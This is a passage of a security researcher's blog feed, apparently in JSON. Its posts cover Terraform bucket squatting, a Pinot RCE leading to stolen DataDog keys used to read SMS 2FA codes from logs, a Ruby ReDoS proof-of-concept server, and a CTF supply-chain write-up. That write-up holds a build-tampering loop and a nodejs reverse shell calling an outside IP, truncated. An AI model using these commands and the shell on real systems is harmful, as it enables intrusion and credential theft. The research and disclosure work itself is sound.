href=\"https://blog.caller.xyz/cheeky-bucket-squatting-defeated-by-terraform/\">#</a></h2>\n<p>So looks like this was pointless. It's plausible that the engineers seeing a Terraform error and a bucket with their super secret naming scheme could force Terraform to use my evil bucket, but still fairly unlikely. In this case, they just made new buckets with another name.</p>\n<p>If my aim was just to harrass their dev team, I totally would have gone full speed on the enumeration and registered a prod bucket every time I noticed a new staging bucket, but I let it slide. I did find the modified staging bucket name but was boring and decided not to preregister the prod bucket.</p>\n<p>This wasted way too much time and all the information you can get is:</p>\n<ul>\n<li>AWS account ID</li>\n<li>AWS Terraform role names</li>\n<li>Engineer IP addresses pointing to different cities</li>\n<li>Engineer favourite browsers and versions</li>\n<li>Timestamps of when engineers are awake (or awake due to a failed Terraform alert)</li>\n</ul>\n<p>If they didn't use terraform but use some sort of create-if-not-exists script for S3 buckets then I might have been owning all their data. Instead I just annoyed them.</p>\n",
			"date_published": "2023-12-01T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/pinot-rce-datadog-your-2fa-codes-off-the-rails/",
			"url": "https://blog.caller.xyz/pinot-rce-datadog-your-2fa-codes-off-the-rails/",
			"title": "Pinot RCE, DataDog, your 2FA codes off the rails",
			"content_html": "<p>If your web application sends SMSs to your customers, you probably submit the messages via a commercial third-party API. The alternative would be dealing with mobile networks directly, but that would require significantly more engineering resources. Whether you're sending 2FA codes or messages from healthcare providers, this is a sensible decision, but it does expose your data to the vendor's information security practices.</p>\n<p>As your due diligence, you can require vendors to adhere to certain compliance frameworks such as SOC II, HIPAA and the rest of the alphabet soup, but in terms of the real world information security practices of their engineers and data scientists it means very little.</p>\n<p>I previously published research about <a href=\"https://blog.caller.xyz/apache-pinot-insecurity/\">Apache Pinot</a> on <a href=\"https://blog.doyensec.com/2022/06/09/apache-pinot-sqli-rce.html\">Doyensec's blog</a> where I dropped a few vulnerabilities, the more serious of which have been fixed.</p>\n<p>One of the components of Apache Pinot is the Controller. This service has a web interface allowing you to submit SQL queries to the Pinot Broker. It also allows you to configure the tables, settings and ZooKeeper, essentially giving admin access to the database service. What's more, from the Controller you can access an RCE &quot;feature&quot; giving root access to the Server component.</p>\n<p>Surely nobody would be foolhardy enough to make such a service accessible on the internet!</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/55cnGiU6yu-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/55cnGiU6yu-1200.webp 1200w\"><img alt=\"Surely often means you aren't that sure. Here's a Pinot Controller in the wild.\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/55cnGiU6yu-1200.png\" width=\"1200\" height=\"457\"></picture><figcaption>Surely often means you aren't that sure. Here's a Pinot Controller in the wild.</figcaption></figure><p></p>\n<p>Well, I've looked and there aren't many, but in amongst the test servers you do see the odd cryptocurrency exchange. As described in my previous <a href=\"https://blog.caller.xyz/apache-pinot-insecurity/\">Pinot research article</a>, RCE is not usually exciting for it's own sake on such a containerised platform. The goal instead is to steal temporary cloud credentials. When I find a Controller hosted in Amazon EKS or EC2, I like to see if, instead of being sandboxed from the rest of the organisation, the RCE gives me fun IAM permissions.</p>\n<p>The enumeration is the same as described in my <a href=\"https://blog.caller.xyz/big-data-lake-big-data-leak/\">BSides talk about Apache YARN / Hadoop clusters</a>.</p>\n<p>Until now, I had mostly ended up on boring test or staging accounts. The main culprits for storing all of their clients' production and test environments in a single AWS account are in fact AWS consultant companies.</p>\n<p>Permissions for a recently breached target were mostly fine. Appropriate policies were applied so that using AWS credentials exfiltrated via the Pinot RCE, I could only access the staging S3 buckets (not production). Nothing worth reporting to their VDP. When it came to SSM however, I hit the jackpot. Out popped over 2000 SSM parameters. SSM (AWS System Manager) is a cloud-based configuration and secret store. While most parameters were test related, I got lucky with some production secrets:</p>\n<ul>\n<li>a Slack token without read access (write-only)</li>\n<li>a GitHub token with useful permissions</li>\n<li>DataDog <a href=\"https://docs.datadoghq.com/account_management/api-app-keys/\">application and API keys</a></li>\n</ul>\n<p>The Slack token helped me confirm that the system was in fact owned by C*llR*il:</p>\n<pre class=\"language-bash\" tabindex=\"0\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token parameter variable\">-s</span> https://slack.com/api/auth.test <span class=\"token parameter variable\">-H</span> <span class=\"token string\">'Authorization: Bearer xoxb-rEdAcTeD'</span> <span class=\"token operator\">|</span> jq</code></pre>\n<pre class=\"language-json\" tabindex=\"0\"><code class=\"language-json\"><span class=\"token punctuation\">{</span>\n  <span class=\"token property\">\"ok\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"url\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"https://c*llr*il.slack.com/\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"team\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"C*llR*il\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"user\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"deploy_bot\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"team_id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"rEdAcTeD\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"user_id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"rEdAcTeD\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"bot_id\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"rEdAcTeD\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token property\">\"is_enterprise_install\"</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span>\n<span class=\"token punctuation\">}</span></code></pre>\n<p>It turns out that the DataDog keys were the most interesting both because I'd never played with the API before and because of the confidentiality breach it caused.</p>\n<p>DataDog API keys give basic access to the organisation but not the majority of the API.\nApplication keys are created by a user and have the full permissions of that user unless further restricted by <a href=\"https://docs.datadoghq.com/api/latest/scopes/\">scopes</a>.\nApplication keys are required for the majority of DataDog API calls.</p>\n<p>All apps need to be deployed with some sort of DataDog API key in order to submit logs. In combination with the Application key retrieved from SSM, however, logs could be queried and read. This is not a level of access that you hope an attacker has, but you don't need an all-of-nothing attitude to security. Rather than saying &quot;if someone has access to all the production logs then it's game over,&quot; defence-in-depth suggests that by not logging secrets or PII you can limit the damage.</p>\n<p>After a very quick poke around I didn't find any evidence of secrets or PII being routinely stored in logs when the application flows along the happy path. When the application encounters errors, however, full SMS messages (metadata and content) are dumped in the logs.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/xKXETffFDP-840.avif 840w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/xKXETffFDP-840.webp 840w\"><img alt=\"Private SMS to your doctor, in plaintext logs\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/xKXETffFDP-840.png\" width=\"840\" height=\"352\"></picture><figcaption>Private SMS to your doctor, in plaintext logs</figcaption></figure><p></p>\n<p>Ideally this would be only in exceptional cases rather than commonly occurring problems. To fix the systems it is important that developers are aware of the errors, but consider whether the entire plaintext message content needs to be available to and searchable by all developers. It feels like overkill to encrypt or worry about logs when attackers can't read them... except I have the DataDog keys so I can.</p>\n<p>If the threat of SIM-swapping didn't already make you consider SMS 2FA dead, the following imagined attack scenario should.</p>\n<p>Search the logs for recent errors sending bank 2FA codes. Now you have the name of a bank, the phone number of a customer, and the ability to read SMS messages sent by the bank. You can use your knowledge that the user is having difficulty logging in to your advantage in your smishing (SMS phishing) message.</p>\n<pre class=\"language-bash\" tabindex=\"0\"><code class=\"language-bash\"><span class=\"token function\">curl</span> <span class=\"token string\">\"https://api.datadoghq.com/api/v2/logs/events/search\"</span> <span class=\"token punctuation\">\\</span>\n<span class=\"token parameter variable\">-H</span> <span class=\"token string\">\"Accept: application/json\"</span> <span class=\"token punctuation\">\\</span>\n<span class=\"token parameter variable\">-H</span> <span class=\"token string\">\"DD-API-KEY: rEdAcTeD\"</span> <span class=\"token parameter variable\">-H</span> <span class=\"token string\">\"DD-APPLICATION-KEY: rEdAcTeD\"</span> <span class=\"token punctuation\">\\</span>\n<span class=\"token parameter variable\">-H</span> <span class=\"token string\">\"Content-Type: application/json\"</span> <span class=\"token punctuation\">\\</span>\n<span class=\"token parameter variable\">-d</span> <span class=\"token string\">'{\"filter\":{\"from\":\"now-32d\",\"query\":\"security code\"}}'</span> <span class=\"token punctuation\">\\</span>\n<span class=\"token operator\">|</span> jq</code></pre>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/n8CzxSAeNs-839.avif 839w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/n8CzxSAeNs-839.webp 839w\"><img alt=\"Super security codes\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/n8CzxSAeNs-839.png\" width=\"839\" height=\"241\"></picture><figcaption>Super security codes</figcaption></figure>\n‌<figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/jicqWlj1Y2-840.avif 840w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/jicqWlj1Y2-840.webp 840w\"><img alt=\"More bank codes\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/jicqWlj1Y2-840.png\" width=\"840\" height=\"352\"></picture><figcaption>More bank codes</figcaption></figure><p></p>\n<p>Smish to get the user's email address, then follow the reset password flow and intercept the SMS code.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/VMU7Lb85h6-841.avif 841w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/VMU7Lb85h6-841.webp 841w\"><img alt=\"Password reset via SMS\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/VMU7Lb85h6-841.png\" width=\"841\" height=\"256\"></picture><figcaption>Password reset via SMS</figcaption></figure><p></p>\n<p>Or, if that requires email access, smish for the username and password. This is still not automatic account access, but two factor authentication is reduced to a single factor.</p>\n<p>The DataDog API also allows user management, retrieving <a href=\"https://docs.datadoghq.com/api/latest/notebooks/#get-all-notebooks\">Notebooks</a> which are used for writing postmortems, and querying <a href=\"https://docs.datadoghq.com/real_user_monitoring/\">Real User Monitoring</a> (RUM). RUM records the URL, activity and browser information for all sessions like a super-powerful Google Analytics but with actual user account information attached.\nThis can be used to sniff UUIDs, user email addresses and generally spy on the activity of all users.\nAWS events can also be ingested using the <a href=\"https://docs.datadoghq.com/logs/guide/forwarder/\">Forwarder</a> which is a lambda you deploy in your AWS account.\nIf DataDog <a href=\"https://docs.datadoghq.com/account_management/audit_trail/\">Audit Trail</a> is enabled, it should be possible, once alerted, for the security team to spot misuse of the DataDog API by an attacker.</p>\n<p>C*llR*il has a Vulnerability Disclosure Program (VDP) allowing security researchers to notify them of breaches. In contrast to a Bug Bounty program, a VDP does not offer any rewards, but also does not prohibit public disclosure upon resolution. Normally when I report such a critical vulnerability to a VDP, the report gets transferred to the company's private beg bounty program and they pay me a bounty. I feel like C*llR*il are stingy bastards for refusing to do that (if such a private program exists). Oh well, I wasn't expecting money when reporting to a VDP anyway and at least they had some sort of security program. The team says the incident is now resolved.</p>\n<p>In summary:</p>\n<ul>\n<li>I haven't found any many exciting exposed Pinot controllers, majority are for testing</li>\n<li>Pinot Controller provides RCE which gives AWS credentials</li>\n<li>Staging environments should not have access to production secrets with super-admin permissions</li>\n<li>DataDog API/Application key pairs with read access can be a giant persistent confidentiality breach</li>\n<li>Logging PII and secrets is a no-no</li>\n<li>Hacking an SMS provider can lead to bank account takeovers (customers of customers of the provider)</li>\n</ul>\n",
			"date_published": "2023-06-30T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/taiwan-motorcycle-scooter-licence-idp-issue/",
			"url": "https://blog.caller.xyz/taiwan-motorcycle-scooter-licence-idp-issue/",
			"title": "Taiwan Motorcycle / Scooter Licence - IDP Issue",
			"content_html": "<p>Taiwan is a scooter-powered country 🏍️.\nI 好不容易 passed my United Kingdom &quot;A&quot; licence allowing me to ride a motorcycle without any size restrictions.\nAccording to what I'd read, an International Driving Permit (IDP) with the &quot;A&quot; stamp should work in Taiwan.</p>\n<p>However, it's not that simple. While IDPs for certain country and state licences are valid in Taiwan, IDP validity depends on <strong>reciprocity</strong>.</p>\n<p><strong>While you can drive a car with your IDP, Taiwan does not recognise the United Kingdom motorcycle licence.</strong></p>\n<p>That means:</p>\n<ol>\n<li>you cannot legally ride a motorcycle in Taiwan with a UK IDP.</li>\n<li>if you exchange your UK driving licence, the motorcycle category will not carry over.</li>\n</ol>\n<p>Why? The United Kindom does not recognise the Taiwanese motorcycle licence, so by reciprocity Taiwan does not accept the British licence.</p>\n<p>Why? I don't know, but seeing the fairly shocking lack of rider education in Taiwan it's possibly for the best.</p>\n<p>So, having brought all my motorcycle gear with me, I need to get a Taiwan motorcycle licence before I can ride.</p>\n<h2 id=\"getting-a-motorcycle-licence\" tabindex=\"-1\">Getting a Motorcycle Licence <a class=\"header-anchor\" href=\"https://blog.caller.xyz/taiwan-motorcycle-scooter-licence-idp-issue/\">#</a></h2>\n<p>First, you need an Alien Resident Certificate (ARC) 👽 with 6-months validity (not sure if remaining or total).</p>\n<p>While you can get all the way to passing your test without an address on the ARC, don't do that.\nWithout an address, they will be unable to give you a licence at the end.</p>\n<p>You need both 1-inch and 2-inch ID photos from a photo booth. 2-inch for the medical exam and 1-inch for the actual licence.</p>\n<p>Go to a hospital and at the information counter ask for a medical exam for the motorcycle driving licence （體檢 = 體格檢查）.\nYou will have to give some details, pay the fee, fill the forms and then bounce between different rooms where you will have your eyesight checked and height and weight recorded.\nA doctor asked questions like do I drink or do I do exercise.\nEvery single person I met warned me that Taiwan's roads are dangerous and I must be careful.\nAt the end you'll receive a stamped form to bring to the theory and practical test.</p>\n<p>The actual test should be booked online. When you get there you'll have to sit in a 2-hour safety presentation in Chinese. Participation or understanding Chinese is not required.\nAll I remember was a slide telling you that you can't have green lights on your bike and at the end there was a fun accident compilation.\nPretty scary seeing trucks mowing down scooters without a clear idea of whether the scooter driver should have done anything differently.</p>\n<p>Then you take the theory test on a computer. You should have already practised online and revised the questions. Full questions and answers can be found online.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/F8SQaitlU1-1046.avif 1046w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/F8SQaitlU1-1046.webp 1046w\"><img alt=\"The test can be taken in several languages. The English is sometimes amusing.\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/F8SQaitlU1-1046.png\" width=\"1046\" height=\"431\"></picture><figcaption>The test can be taken in several languages. The English is sometimes amusing.</figcaption></figure><p></p>\n<p>If you pass, which you should because it's really easy, you can get in line for the practical exam.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/IAlgzc77L3-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/IAlgzc77L3-1200.webp 1200w\"><img alt=\"The test centre at one of the Motor Vehicles Offices (監理所) in 高雄\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/IAlgzc77L3-1200.jpeg\" width=\"1200\" height=\"578\"></picture><figcaption>The test centre at one of the Motor Vehicles Offices (監理所) in 高雄</figcaption></figure><p></p>\n<p>You can find videos online of the test and you can also have a practice-run beforehand.</p>\n<p>https://www.youtube.com/watch?v=FTcshb12AGc</p>\n<p>You need to crawl slowly between two lines, demonstrate a hook left turn, stop at a railway crossing, look before changing lanes and basically not be an idiot. It's all done off the roads under that roof.</p>\n<p>https://www.youtube.com/watch?v=Lgr8fSSBl84</p>\n<p>Oh yeah, you'll need a bike to do the test. I think some centres allow you to rent one but you're probably supposed to borrow a friend's. Since rental companies aren't clear about which IDPs are valid and which aren't, you can probably just rent a bike. I made my life much harder than necessary by riding a manual geared Suzuki GSX-S150.\nThe wheels are much bigger than you get on scooters, which actually made it tricky to turn between the narrow marked lines.\nLuckily my clutch control is pretty good, so after a little practice I was fine.\nEveryone else was on little scooters.</p>\n<p>Then pay the fee and you'll be given your licence valid up to 250cc （普通重型機車）. Piece of cake. No road riding, emergency stop, swerve test, figure of eight, hill start.</p>\n<p>Need to wait a year until you can take a &gt;250cc licence（大型重型機車 split into 未滿550C.C. and 550C.C.以上）for yellow / red plate motorcycles. The test seems a bit more thorough, but is also performed off the road and pictures I've seen online show instructors riding without even wearing helmets.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/Hn0IIXezb_-500.avif 500w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/Hn0IIXezb_-500.webp 500w\"><img alt=\"Suzuki GSX-S150 says hello from 霧台 in 屏東縣\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/Hn0IIXezb_-500.jpeg\" width=\"500\" height=\"888\"></picture><figcaption>Suzuki GSX-S150 says hello from 霧台 in 屏東縣</figcaption></figure><p></p>\n",
			"date_published": "2023-03-01T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/apache-pinot-insecurity/",
			"url": "https://blog.caller.xyz/apache-pinot-insecurity/",
			"title": "Apache Pinot Insecurity",
			"content_html": "<p>Check out my post on the Doyensec blog about hacking database system Apache Pinot: <a href=\"https://blog.doyensec.com/2022/06/09/apache-pinot-sqli-rce.html\">Apache Pinot SQLi &amp; RCE Cheat Sheet</a>.</p>\n<p>The main purpose is to discuss how if you already have SQL injection you can escalate it to Remote Code Execution.</p>\n<p>I also dropped a 0-day bug about the insane behaviour of <code>OPTION(a=b)</code>. In pathological cases this could lead to SQLi, but the risk is super low so I don't think it was too naughty. It will be really useful for fingerprinting though.</p>\n<p>Additionally there are Denial of Service bugs (ReDoS and lack of any effective timeouts) mentioned.</p>\n<p>Note that there are no CVEs or advisories associated with any of these bugs.</p>\n<p>Enjoy!</p>\n",
			"date_published": "2022-06-09T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/salesforce-hardest-hitting-hacker/",
			"url": "https://blog.caller.xyz/salesforce-hardest-hitting-hacker/",
			"title": "Salesforce Hardest Hitting Hacker",
			"content_html": "<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/VU5GK4Yknb-500.avif 500w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/VU5GK4Yknb-500.webp 500w\"><img alt=\"Salesforce Bug Bounty Program Hardest Hitting Hacker 2021 :trophy:\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/VU5GK4Yknb-500.jpeg\" width=\"500\" height=\"624\"></picture><figcaption>Salesforce Bug Bounty Program Hardest Hitting Hacker 2021 🏆</figcaption></figure><p></p>\n<p><strong>2023 EDIT: Also got Hardest Hitting Hacker 2022 but Salesforce didn't send me another trophy</strong></p>\n",
			"date_published": "2022-04-01T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/redos-in-ruby-net-http-when-parsing-response-headers/",
			"url": "https://blog.caller.xyz/redos-in-ruby-net-http-when-parsing-response-headers/",
			"title": "ReDoS in Ruby net/http when parsing response headers",
			"content_html": "<p>A regular expression denial of service (ReDoS) bug is present in <a href=\"https://github.com/ruby/net-http/blob/7b852b1feb7c1c0bc3019687d6ee5c385ce26eb9/lib/net/http/response.rb#L57\">net/http/response.rb#57</a> when reading headers line by line. This affects ruby applications which make web requests to untrusted HTTP servers such as for crawlers or webhooks. A malicious remote server can respond with a long header line, making ruby get stuck processing the regular expression at 100% CPU for a very long time:</p>\n<pre class=\"language-rb\" tabindex=\"0\"><code class=\"language-rb\">line <span class=\"token operator\">=</span> sock<span class=\"token punctuation\">.</span>readuntil<span class=\"token punctuation\">(</span><span class=\"token string-literal\"><span class=\"token string\">\"\\n\"</span></span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>sub<span class=\"token punctuation\">(</span><span class=\"token regex-literal\"><span class=\"token regex\">/\\s+\\z/</span></span><span class=\"token punctuation\">,</span> <span class=\"token string-literal\"><span class=\"token string\">''</span></span><span class=\"token punctuation\">)</span></code></pre>\n<p>The <code>sub</code> regex is the issue. While it looks safe and linear, this <code>sub</code> operation will actually have quadratic complexity as there is no starting anchor.\nA header line which contains many consecutive spaces but <em>does not end in a space</em> will exhibit extreme backtracking, e.g:</p>\n<pre class=\"language-rb\" tabindex=\"0\"><code class=\"language-rb\"><span class=\"token punctuation\">(</span> <span class=\"token string-literal\"><span class=\"token string\">\"a\"</span></span> <span class=\"token operator\">+</span> <span class=\"token string-literal\"><span class=\"token string\">\" \"</span></span> <span class=\"token operator\">*</span> <span class=\"token number\">950000</span> <span class=\"token operator\">+</span> <span class=\"token string-literal\"><span class=\"token string\">\"b\"</span></span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>sub<span class=\"token punctuation\">(</span><span class=\"token regex-literal\"><span class=\"token regex\">/\\s+\\z/</span></span><span class=\"token punctuation\">,</span> <span class=\"token string-literal\"><span class=\"token string\">''</span></span><span class=\"token punctuation\">)</span></code></pre>\n<p>The time complexity is quadratic with respect to the number of spaces in the string (doubling the number of spaces quadruples the processing time). Approximate timings from my laptop (I measured until 10,000 and then extrapolated, a different laptop was a bit faster but still displays the terrible performance for long strings):</p>\n<pre><code>|  Spaces  |  Seconds   |  Hours   |  Days  |\n|----------|------------|----------|--------|\n|     2000 |        1.8 |          |        |\n|     4000 |        7.2 |          |        |\n|     8000 |       28.6 |          |        |\n|    10000 |       44.7 |          |        |\n|   100000 |     4473.0 |     1.24 |   0.05 |\n|  1000000 |   447300.0 |   124.25 |   5.18 |\n| 10000000 | 44730000.0 | 12425.00 | 517.71 |\n</code></pre>\n<p>This can be reproduced with the following malicious server:</p>\n<pre class=\"language-rb\" tabindex=\"0\"><code class=\"language-rb\"><span class=\"token keyword\">require</span> <span class=\"token string-literal\"><span class=\"token string\">'socket'</span></span>\nserver <span class=\"token operator\">=</span> <span class=\"token class-name\">TCPServer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">new</span> <span class=\"token number\">3000</span>\npayload <span class=\"token operator\">=</span> <span class=\"token string-literal\"><span class=\"token string\">\"afe:w\"</span></span> <span class=\"token operator\">+</span> <span class=\"token string-literal\"><span class=\"token string\">\" \"</span></span> <span class=\"token operator\">*</span> <span class=\"token number\">1</span>_000_000 <span class=\"token operator\">+</span> <span class=\"token string-literal\"><span class=\"token string\">\"goats\\r\\n\"</span></span>\n<span class=\"token keyword\">while</span> session <span class=\"token operator\">=</span> server<span class=\"token punctuation\">.</span>accept\n  request <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>gets\n  puts request\n  session<span class=\"token punctuation\">.</span>print <span class=\"token string-literal\"><span class=\"token string\">\"HTTP/1.1 200\\r\\n\"</span></span> <span class=\"token comment\"># 1</span>\n  session<span class=\"token punctuation\">.</span>print payload\n  session<span class=\"token punctuation\">.</span>print <span class=\"token string-literal\"><span class=\"token string\">\"\\r\\n\"</span></span>\n  session<span class=\"token punctuation\">.</span>close\n  puts <span class=\"token string-literal\"><span class=\"token string\">\"sent\"</span></span>\n<span class=\"token keyword\">end</span></code></pre>\n<p>And vulnerable client which suffers from DoS:</p>\n<pre class=\"language-rb\" tabindex=\"0\"><code class=\"language-rb\"><span class=\"token keyword\">require</span> <span class=\"token string-literal\"><span class=\"token string\">'net/http'</span></span>\nuri <span class=\"token operator\">=</span> <span class=\"token constant\">URI</span><span class=\"token punctuation\">(</span><span class=\"token string-literal\"><span class=\"token string\">'http://localhost:3000/x'</span></span><span class=\"token punctuation\">)</span>\nNet<span class=\"token double-colon punctuation\">::</span><span class=\"token constant\">HTTP</span><span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>uri<span class=\"token punctuation\">)</span></code></pre>\n<p>The inefficient regex should probably be replaced with <code>rstrip</code>:</p>\n<pre class=\"language-rb\" tabindex=\"0\"><code class=\"language-rb\">sock<span class=\"token punctuation\">.</span>readuntil<span class=\"token punctuation\">(</span><span class=\"token string-literal\"><span class=\"token string\">\"\\n\"</span></span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rstrip</code></pre>\n<p>I got a <a href=\"https://hackerone.com/reports/1531958\">bounty from Gitlab</a> for reporting that it affected their webhooks.</p>\n<p>You can read Gitlab's internal discussions about it in <a href=\"https://gitlab.com/gitlab-org/gitlab/-/issues/358160\">their issue</a>. Since Ruby is a trash fire, Gitlab had to work around the issue by <a href=\"https://gitlab.com/gitlab-org/gitlab/-/blob/70654c7306d007eb6bdfa970747f682a7f556718/config/initializers/net_http_response_patch.rb\">monkey-patching net/http</a>.</p>\n",
			"date_published": "2022-04-01T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/defcon29-rtv-ctf/",
			"url": "https://blog.caller.xyz/defcon29-rtv-ctf/",
			"title": "DEFCON29 RTV CTF",
			"content_html": "<p>I played the DEFCON29 (2021) Red Team Village CTF online with team &quot;Son of Anton&quot;. After qualifying in 4th place we then came <strong>4th in the finals</strong> 🏅.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/T_wLFUkOAo-1137.avif 1137w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/T_wLFUkOAo-1137.webp 1137w\"><img alt=\"Thanks to RTV and the challenge writers for the awesome challenges\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/T_wLFUkOAo-1137.png\" width=\"1137\" height=\"752\"></picture><figcaption>Thanks to RTV and the challenge writers for the awesome challenges</figcaption></figure><p></p>\n<p>Here, I'll just write some semi-legible notes about the &quot;supply chain attack&quot; portion.</p>\n<h2 id=\"supply-chain\" tabindex=\"-1\">Supply Chain <a class=\"header-anchor\" href=\"https://blog.caller.xyz/defcon29-rtv-ctf/\">#</a></h2>\n<p>Our story starts where we have already obtained the private key and PEM password for user <code>bgilfoyle</code>.</p>\n<p>SSHing in to the LunarFire box <code>bgilfoyle@10.0.40.70</code> we see that Gitea (a Git server a little like Gitlab) is on port 3000 and AppVeyor (a CI/CD platform) is on 8050.</p>\n<p>Gitea gives us unauthenticated access to the source code of the Wuphf Electron app (we can't directly access the git user's home directory), although as we see later, we can grab the source code using our read access to the AppVeyor home directory.</p>\n<p>AppVeyor build logs can be viewed at <code>http://10.0.40.70:8050/project/AppVeyor/wuphf/history</code>, and the progress of this continuously running Electron build pipeline can also be monitored via <code>ps</code>.</p>\n<p>The <code>Git - CI/CD App</code> flag can be found in <code>/home/AppVeyor/</code> which we can read. We also found many directories of the form <code>/home/AppVeyor/Wuphf_1-abcd</code> used for the repeated Wuphf builds. AppVeyor (as user <code>appveyor</code>) clones Wuphf to a new directory, and runs the build steps inside docker with this directory mounted. Surprisingly, these directories are also writeable by our bgilfoyle user.</p>\n<p>The idea then presents itself... can we add an implant to the Electron app by tampering with a build by leaving the following one-liner running?</p>\n<pre class=\"language-sh\" tabindex=\"0\"><code class=\"language-sh\"><span class=\"token keyword\">while</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">do</span> <span class=\"token function\">cat</span> badelectron.js <span class=\"token operator\">></span> /home/AppVeyor/<span class=\"token variable\"><span class=\"token variable\">`</span><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-t</span> /home/AppVeyor/ <span class=\"token operator\">|</span> <span class=\"token function\">grep</span> appveyor <span class=\"token operator\">|</span> <span class=\"token function\">head</span> <span class=\"token parameter variable\">-n</span> <span class=\"token number\">1</span> <span class=\"token operator\">|</span> <span class=\"token function\">awk</span> <span class=\"token string\">'{print $8}'</span><span class=\"token variable\">`</span></span>/build/electron.js<span class=\"token punctuation\">;</span> <span class=\"token function\">sleep</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">done</span></code></pre>\n<p>It takes the newest Wuphf build directory and, in a while loop, overwrites it with badelectron.js - a copy of electron.js with a <a href=\"https://github.com/ctxis/beemka/blob/master/modules/rshell_cmd/templates/code.js\">nodejs reverse shell</a> at the start:</p>\n<pre class=\"language-js\" tabindex=\"0\"><code class=\"language-js\"><span class=\"token keyword\">var</span> net <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'net'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> spawn <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child_process'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>spawn<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> client <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">net<span class=\"token punctuation\">.</span>Socket</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nclient<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span><span class=\"token number\">53</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'175.45.176.1'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> sh<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n        sh <span class=\"token operator\">=</span> <span class=\"token 